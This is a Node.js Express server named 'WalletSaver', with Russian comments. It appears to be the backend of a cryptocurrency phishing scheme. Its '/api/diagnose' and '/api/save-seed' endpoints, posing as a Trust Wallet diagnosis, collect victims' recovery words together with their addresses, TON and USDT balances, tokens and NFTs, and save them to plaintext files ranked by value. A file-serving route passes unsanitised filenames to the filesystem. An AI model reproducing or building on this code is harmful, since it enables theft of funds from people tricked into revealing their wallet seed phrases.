import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';


const app = express();
app.use(cors());
const PORT = process.env.PORT || 3002;
app.use(express.json());

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const walletsDir = path.join(__dirname, 'wallets');
if (!fs.existsSync(walletsDir)) {
  fs.mkdirSync(walletsDir);
}

// POST /save-wallet (старый эндпоинт)
app.post('/save-wallet', (req, res) => {
  const { address } = req.body;
  if (!address) {
    return res.status(400).json({ error: 'No wallet address provided' });
  }
  const filePath = path.join(walletsDir, `wallet_${address}.txt`);
  fs.writeFile(filePath, address, err => {
    if (err) {
      return res.status(500).json({ error: 'Failed to save wallet' });
    }
    res.json({ success: true, file: filePath });
  });
});

// POST /api/diagnose (заглушка)

app.post('/api/diagnose', (req, res) => {
  const {
    walletName = 'Trust Wallet',
    address = '',
    words = [],
    ton = '',
    usdt = '',
    nft = '',
    tokens = '',
    tokenList = '',
    nftList = '',
    wordCount = words.length
  } = req.body;

  const now = new Date();
  const dateStr = now.toLocaleString('ru-RU', { hour12: false });
  const addressShort = address || '---';
  const addressHex = `0_${addressShort.replace(/[^a-zA-Z0-9]/g, '')}`;
  const filename = `${addressHex}.summary.txt`;
  let summary = `=== Новая запись ===\n`;
  summary += `Дата: ${dateStr}\n`;
  summary += `Кошелёк: ${walletName}\n`;
  summary += `Количество слов: ${wordCount}\n`;
  summary += `Адрес кошелька: ${addressShort} - ${addressShort.length} символов начало с UQ\n`;
  summary += `Сумма TON: ${ton}\n`;
  summary += `Сумма USDT: ${usdt}\n`;
  summary += `Количество NFT: ${nft}\n`;
  summary += `Количество токенов всего: ${tokens}\n`;
  summary += `Слова:`;
  words.forEach((w, i) => { summary += `\n${i+1}. ${w}`; });
  summary += `\n\nСписок токенов: ${tokenList}\n`;
  summary += `Список NFT: ${nftList}\n`;

  const filePath = path.join(walletsDir, filename);
  fs.writeFile(filePath, summary, err => {
    if (err) {
      return res.status(500).json({ error: 'Failed to save summary' });
    }
    res.json({ success: true, file: filename, summary });
  });
});

// POST /api/save-seed (заглушка)
app.post('/api/save-seed', (req, res) => {
  const { seed } = req.body;
  if (!seed) {
    return res.status(400).json({ error: 'No seed provided' });
  }
  // Сохраняем seed в файл (или просто подтверждаем)
  res.json({ success: true, message: 'Seed сохранён', seed });
});

// GET /wallets/:filename.summary.txt (отдача файлов)
app.get('/wallets/:filename', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join(walletsDir, filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  res.sendFile(filePath);
});

app.listen(PORT, () => {
  console.log(`WalletSaver server running on http://localhost:${PORT}`);
});
